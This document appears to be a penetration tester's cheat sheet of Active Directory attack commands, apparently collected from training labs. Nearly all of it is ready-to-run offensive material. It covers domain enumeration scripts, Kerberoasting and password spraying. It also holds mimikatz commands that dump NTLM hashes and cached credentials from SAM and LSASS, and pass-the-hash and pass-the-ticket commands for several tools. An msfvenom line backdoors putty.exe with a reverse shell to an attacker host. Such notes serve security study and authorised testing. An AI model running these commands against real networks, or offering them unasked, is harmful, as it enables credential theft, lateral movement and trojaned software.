# Active Directory

## Net commands  

Local user accounts.  

`net user`  

All domain user accounts with /domain flag.  

`net user /domain`  

Display information about a specific user.  

`net user bob_admin /domain`  

Enumerate all groups on the domain.  

`net group /domain`  

## Users  

Powershell script to collect all users.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}

```
## Nested groups  

Using the script to enumerate groups.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}
```  

The above script output can be enumrated for members that are groups (nested).  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(name=Secret_Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}

```  

## Logged on users  

Importing and using powerview to enumerate logged on users.  

```
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client251
```  

Get active sessions, in this case from domain controller.  

`Get-NetSession -ComputerName dc01`  


## Service principal names  

By enumerating spn, we can obtain ip and port numbers of applications running on servers integrated in the AD network, the output can then be used to resolve with nslookup.  
To search for http web servers.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```  
Enumerate all spn and get a service ticket in a format for john or hashcat.  

`Invoke-Kerberoast.ps1`  




## NTLM hash  

NTLM is used when authenticating to a server with an ip address rather than by hostname or if the AD DNS couldnt resolve a hostname.  



NTLM hashes from local SAM.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam

NTLM hashes from LSASS memory.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::msv

Using extracted hashes for pass the hash.

    mimikatz # token::revert
    mimikatz # sekurlsa::pth /user:elliot.alderson /domain:za.tryhackme.com /ntlm:654e4545455e5de /run:"some command"


## Pass the hash  

From pass-the-hash toolkit.  

`pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`  


RDP PTH

    xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

psexec PTH

    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

WinRM PTH

    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

Pass-the-Ticket

    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export

Once the desired ticket has been extracted.

`mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`  

Backdoor .exe files.

`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`  

 ## Logged on users hashes from LSASS memory.  
 
 ```
 mimikatz.exe
 privilege::debug
 sekurlsa::logonpasswords
 ```  
 
 ## Cached credentials  
 
 Show tickets stored in memory.  
 
 `sekurlsa::tickets`  
 
 ## Service tickets  
 
 Requesting a service ticket.  
 
 ```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/theServer.evilcorp.com'
 ```  
List all tickets for current logged in user.  
 
 `klist`  
 
Save ticket to disk.  

`kerberos::list /export`  


 ## Kerberoasting  
 
 Using a wordlist and service granting ticket to brute force and guess a password (kerberoasting).  
 
 ```
 sudo apt update && sudo apt install kerberoast
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```  
 
 
## Password spraying  

Eiter set to -Pass for single password or -File for a wordlist. -Admin is for admin accounts.  

`.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin`  


 
 
 
